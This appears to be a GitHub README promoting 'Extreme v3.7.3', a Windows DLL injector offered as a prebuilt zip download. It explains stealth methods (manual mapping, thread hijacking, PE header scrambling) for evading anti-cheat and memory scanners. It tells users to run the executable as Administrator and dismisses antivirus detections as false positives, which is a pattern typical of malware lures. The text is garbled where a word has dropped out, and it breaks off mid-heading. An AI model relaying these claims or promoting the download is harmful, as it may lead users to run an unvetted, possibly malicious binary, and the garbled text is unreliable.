<img width="381" height="255" alt="images1" src="https://github.com/user-attachments/assets/2141d453-401e-43e3-8783-8ef511a40a34" />

# Extreme 

**Extreme** is a free, portable DLL  for Windows 10 and 11 - supporting Manual Map, LoadLibrary, LdrLoadDll, and stealth injection with thread hijacking and PE header scrambling. Extreme  v3.7.3 is the build most referenced on UnknownCheats and other modding communities, trusted for its reliability across both x86 and x64 processes.

<img width="160" height="160" alt="images2" src="https://github.com/user-attachments/assets/6f3b685f-77bc-49bd-ae7b-9b196e7db7f9" />


## Install
[Download `Extreme-v3.7.3.zip`](https://github.com/ExtremeInjector-Cpp/ExtremeInjector/releases/download/v3.7.3/Extreme-v3.7.3.zip)
---

<img width="403" height="315" alt="images3" src="https://github.com/user-attachments/assets/393ab9f0-612d-420a-8caa-b748a1fd0b8c" />

## Key Features
- **Manual Map injection** - load a DLL into a process without using LoadLibrary, bypasses many basic detection methods
- **LoadLibrary injection** - standard injection via the Windows API, fastest and most compatible method
- **LdrLoadDll injection** - uses a lower-level loader function to avoid some IAT hooks
- **Stealth injection** - combines manual map with PE header wiping for reduced detection surface
- **Thread hijacking** - redirects an existing thread in the target process instead of creating a new one
- **PE header scrambling** - zeroes or randomizes the in-memory PE header after injection
- **x86 and x64 support** - works with both 32-bit and 64-bit target processes
- **Process list with architecture filter** - quickly find and filter running processes by name and bitness
- **Portable** - no installation required, single executable


<img width="366" height="279" alt="images4" src="https://github.com/user-attachments/assets/92425d1a-fd7d-4549-81de-da2156d199b7" />


## Injection Methods Explained

### LoadLibrary
The simplest method. Creates a remote thread in the target process that calls `LoadLibraryW` with the DLL path. Detected by most anti-cheat systems but works for most non-protected processes.


<img width="433" height="409" alt="images5" src="https://github.com/user-attachments/assets/b3bf1117-f0ad-46e3-bf9e-415d24d52fd6" />

### Manual Map
Manually copies the DLL's PE sections into the target process memory, fixes relocations and imports, and calls the entry point via a remote thread or hijacked thread. Does not appear in the module list - significantly harder to detect.

### Thread Hijacking
Instead of creating a new remote thread, this method suspends an existing thread, hijacks its execution context (redirecting RIP/EIP), and resumes it. Avoids `CreateRemoteThread` which is a common detection vector.

### Stealth Injection
Combines manual map with additional post-injection cleanup - PE headers in the target process are wiped or randomized so memory scanners can't identify the loaded module.

## Getting Started
1. **Download** the latest version using the button above.
2. **Extract** the archive.
3. **Run** `Extreme.exe` as Administrator.
4. **Select the target process** from the list - filter by name or architecture if needed.
5. **Browse and select** your DLL file.
6. **Choose your injection method** - Manual Map for stealth, LoadLibrary for simplicity.
7. **Click Inject**.

**Note:** Most games require both the  and the target to run with Administrator privileges.

## Extreme  v3 vs v3.7.3
v3.7.3 is the current stable build. It adds the new stealth injection method, improved x64 process support, and better error reporting compared to earlier v3 releases. The v3 series remains the most downloaded on UnknownCheats.

## Antivirus and False Positives
DLL s are almost always flagged by antivirus software regardless of their actual behavior - this is expected. The detection is based on the tool's capabilities (process memory writing, remote thread creation), not malicious code. Verify the file yourself on [VirusTotal](https://www.virustotal.com) before use.

## Troubleshooting

**Injection failing with "Access Denied"?**
Run Extreme as Administrator. Some processes (system services, anti-cheat protected games) cannot be injected regardless of privileges.

**DLL not found error?**
Make sure the DLL path has no special characters and the file is not locked by another process.

**Manual Map not working on a specific game?**
Some games have integrity checks that detect manual-mapped modules. Try thread hijacking instead.

**x64 process not appearing in the list?**
The process list shows both x86 and x64 processes - use the architecture filter to narrow results.

## System Requirements
- **Windows 10 / 11** (64-bit)
- Administrator privileges required

## Security & Legal
This tool is intended for legitimate use cases such as game modding, software debugging, and development testing. Do not use it to inject malicious code or in games where doing so violates terms of service.

**Recommendations:*